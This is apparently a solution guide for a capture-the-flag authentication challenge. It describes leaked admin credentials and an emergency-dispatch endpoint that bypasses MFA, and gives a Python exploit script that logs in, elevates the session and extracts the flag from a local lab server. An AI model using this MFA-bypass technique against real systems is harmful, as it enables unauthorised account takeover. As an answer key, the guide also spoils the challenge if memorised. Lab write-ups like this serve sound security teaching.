# A07 Medium: Solution Guide

### Vulnerability Analysis
1. Inspect `/services` (Settlement Rails & Treasury Operations) to find the SecOps Change Advisory `SEC-2026-DR`:
   - Active disaster recovery incident ticket: `INC-88219-DR`
   - Root operator maintenance account: `sysadmin_root`
   - Temporary staging failover token: `AutumnSettlement#99`
2. Inspect client JavaScript assets at `/static/js/auth-flow.js` to observe the `SecOpsEmergencyConfig` definition referencing the emergency dispatch elevation route:
   ```javascript
   const SecOpsEmergencyConfig = {
       endpoint: "/api/v1/auth/session/emergency-dispatch",
       protocol: "DR-Failover-v2",
       requiredFields: ["incident_ticket"]
   };
   ```
3. Authenticate to `/login` using the discovered primary credentials:
   - Username: `sysadmin_root`
   - Password: `AutumnSettlement#99`
4. The server validates primary authentication and redirects the session to `/auth/2fa` with `mfa_required: true`.
5. Dispatch an emergency session elevation POST request to `/api/v1/auth/session/emergency-dispatch` with the active DR incident ticket:
   ```json
   {"incident_ticket": "INC-88219-DR"}
   ```
   (or HTTP header `X-SecOps-Ticket: INC-88219-DR`).
6. The backend elevates the session (`mfa_verified: true`). Access `/security/audit-vault` to extract the dynamic flag.

---

### Exploit Script
```python
import requests
import re

BASE_URL = "http://127.0.0.1:6020"
session = requests.Session()

# 1. Step 1 Login
login_resp = session.post(f"{BASE_URL}/login", data={
    "username": "sysadmin_root",
    "password": "AutumnSettlement#99"
})
assert login_resp.status_code == 200 or login_resp.history

# 2. MFA Elevation via SecOps Emergency Dispatch
dispatch_resp = session.post(
    f"{BASE_URL}/api/v1/auth/session/emergency-dispatch",
    json={"incident_ticket": "INC-88219-DR"}
)
assert dispatch_resp.status_code == 200
assert dispatch_resp.json().get("success") is True

# 3. Retrieve Flag from Executive Vault
vault_resp = session.get(f"{BASE_URL}/security/audit-vault")
flag = re.search(r"RTSA\{[^}]+\}", vault_resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
